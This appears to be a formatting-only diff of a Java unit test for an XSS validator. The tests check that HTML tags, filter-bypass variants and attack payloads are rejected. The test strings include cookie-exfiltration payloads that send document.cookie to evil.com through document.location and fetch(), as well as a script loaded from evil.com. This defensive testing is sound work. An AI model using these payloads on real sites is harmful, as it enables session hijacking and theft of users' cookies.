@@ -1,5 +1,7 @@
 package org.dromara.common.core.xss;
 
+import static org.assertj.core.api.Assertions.assertThat;
+
 import jakarta.validation.ConstraintValidatorContext;
 import org.junit.jupiter.api.BeforeEach;
 import org.junit.jupiter.api.DisplayName;
@@ -10,8 +12,6 @@ import org.junit.jupiter.params.provider.NullAndEmptySource;
 import org.junit.jupiter.params.provider.ValueSource;
 import org.mockito.Mock;
 import org.mockito.MockitoAnnotations;
-
-import static org.assertj.core.api.Assertions.assertThat;
 
 /**
  * XSS 验证器单元测试
@@ -24,8 +24,7 @@ class XssValidatorTest {
 
     private XssValidator validator;
 
-    @Mock
-    private ConstraintValidatorContext context;
+    @Mock private ConstraintValidatorContext context;
 
     @BeforeEach
     void setUp() {
@@ -55,15 +54,16 @@ class XssValidatorTest {
         }
 
         @ParameterizedTest
-        @ValueSource(strings = {
-            "user@example.com",
-            "https://www.example.com",
-            "Line1\nLine2",
-            "Tab\tSeparated",
-            "Special chars: @#$%^&*()",
-            "JSON: {\"key\":\"value\"}",
-            "SQL: SELECT * FROM users WHERE id = 1"
-        })
+        @ValueSource(
+                strings = {
+                    "user@example.com",
+                    "https://www.example.com",
+                    "Line1\nLine2",
+                    "Tab\tSeparated",
+                    "Special chars: @#$%^&*()",
+                    "JSON: {\"key\":\"value\"}",
+                    "SQL: SELECT * FROM users WHERE id = 1"
+                })
         @DisplayName("应返回true当输入为安全的特殊字符")
         void shouldReturnTrueWhenSafeSpecialChars(String input) {
             // Act & Assert
@@ -76,15 +76,16 @@ class XssValidatorTest {
     class XssAttackTests {
 
         @ParameterizedTest
-        @ValueSource(strings = {
-            "<script>alert('XSS')</script>",
-            "<img src=x onerror=alert('XSS')>",
-            "<svg onload=alert('XSS')>",
-            "<iframe src='javascript:alert(1)'>",
-            "<body onload=alert('XSS')>",
-            "<div onclick='alert(1)'>Click me</div>",
-            "<a href='javascript:void(0)'>Link</a>"
-        })
+        @ValueSource(
+                strings = {
+                    "<script>alert('XSS')</script>",
+                    "<img src=x onerror=alert('XSS')>",
+                    "<svg onload=alert('XSS')>",
+                    "<iframe src='javascript:alert(1)'>",
+                    "<body onload=alert('XSS')>",
+                    "<div onclick='alert(1)'>Click me</div>",
+                    "<a href='javascript:void(0)'>Link</a>"
+                })
         @DisplayName("应返回false当输入包含HTML标签")
         void shouldReturnFalseWhenContainsHtmlTags(String input) {
             // Act & Assert
@@ -92,14 +93,15 @@ class XssValidatorTest {
         }
 
         @ParameterizedTest
-        @ValueSource(strings = {
-            "<h1>Title</h1>",
-            "<p>Paragraph</p>",
-            "<br>",
-            "<hr/>",
-            "<ul><li>Item</li></ul>",
-            "<table><tr><td>Cell</td></tr></table>"
-        })
+        @ValueSource(
+                strings = {
+                    "<h1>Title</h1>",
+                    "<p>Paragraph</p>",
+                    "<br>",
+                    "<hr/>",
+                    "<ul><li>Item</li></ul>",
+                    "<table><tr><td>Cell</td></tr></table>"
+                })
         @DisplayName("应返回false当输入包含常规HTML标签")
         void shouldReturnFalseWhenContainsCommonHtmlTags(String input) {
             // Act & Assert
@@ -107,14 +109,15 @@ class XssValidatorTest {
         }
 
         @ParameterizedTest
-        @ValueSource(strings = {
-            "<<SCRIPT>alert('XSS')</SCRIPT>",
-            "<scr<script>ipt>alert('XSS')</script>",
-            "< script >alert('XSS')</script>",
-            "<SCRIPT SRC=http://evil.com/xss.js></SCRIPT>",
-            "<<img src=x onerror=alert(1)>",
-            "<IMG\nSRC=\"javascript:alert('XSS');\">"
-        })
+        @ValueSource(
+                strings = {
+                    "<<SCRIPT>alert('XSS')</SCRIPT>",
+                    "<scr<script>ipt>alert('XSS')</script>",
+                    "< script >alert('XSS')</script>",
+                    "<SCRIPT SRC=http://evil.com/xss.js></SCRIPT>",
+                    "<<img src=x onerror=alert(1)>",
+                    "<IMG\nSRC=\"javascript:alert('XSS');\">"
+                })
         @DisplayName("应返回false当输入包含XSS绕过尝试")
         void shouldReturnFalseWhenXssBypassAttempt(String input) {
             // Act & Assert
@@ -139,7 +142,8 @@ class XssValidatorTest {
         @DisplayName("应返回true当输入包含转义的HTML实体")
         void shouldReturnTrueWhenEscapedHtmlEntities() {
             // Act & Assert
-            assertThat(validator.isValid("&lt;script&gt;alert('XSS')&lt;/script&gt;", context)).isTrue();
+            assertThat(validator.isValid("&lt;script&gt;alert('XSS')&lt;/script&gt;", context))
+                    .isTrue();
             assertThat(validator.isValid("&amp;", context)).isTrue();
             assertThat(validator.isValid("&nbsp;", context)).isTrue();
             assertThat(validator.isValid("&quot;Hello&quot;", context)).isTrue();
@@ -187,15 +191,16 @@ class XssValidatorTest {
         void shouldHandleMultipleTags() {
             // Act & Assert
             assertThat(validator.isValid("<div><p>Text</p></div>", context)).isFalse();
-            assertThat(validator.isValid("Normal text <script>alert(1)</script> more text", context)).isFalse();
+            assertThat(
+                            validator.isValid(
+                                    "Normal text <script>alert(1)</script> more text", context))
+                    .isFalse();
         }
 
         @Test
         @DisplayName("应正确处理包含换行符的HTML")
         void shouldHandleMultilineHtml() {
-            String multilineHtml = "<div>\n" +
-                "  <p>Paragraph</p>\n" +
-                "</div>";
+            String multilineHtml = "<div>\n" + "  <p>Paragraph</p>\n" + "</div>";
 
             // Act & Assert
             assertThat(validator.isValid(multilineHtml, context)).isFalse();
@@ -220,14 +225,24 @@ class XssValidatorTest {
         @DisplayName("应返回false当输入包含XSS攻击载荷")
         void shouldReturnFalseWhenXssPayload() {
             // 常见的XSS攻击载荷
-            assertThat(validator.isValid("<script>document.location='http://evil.com?cookie='+document.cookie</script>", context)).isFalse();
-            assertThat(validator.isValid("<img src=x onerror='fetch(\"http://evil.com?c=\"+document.cookie)'>", context)).isFalse();
+            assertThat(
+                            validator.isValid(
+                                    "<script>document.location='http://evil.com?cookie='+document.cookie</script>",
+                                    context))
+                    .isFalse();
+            assertThat(
+                            validator.isValid(
+                                    "<img src=x"
+                                        + " onerror='fetch(\"http://evil.com?c=\"+document.cookie)'>",
+                                    context))
+                    .isFalse();
         }
 
         @Test
         @DisplayName("应返回true当输入为富文本编辑器转义后的内容")
         void shouldReturnTrueWhenEscapedRichText() {
-            String escapedHtml = "&lt;p&gt;This is &lt;strong&gt;bold&lt;/strong&gt; text&lt;/p&gt;";
+            String escapedHtml =
+                    "&lt;p&gt;This is &lt;strong&gt;bold&lt;/strong&gt; text&lt;/p&gt;";
 
             // Act & Assert
             assertThat(validator.isValid(escapedHtml, context)).isTrue();
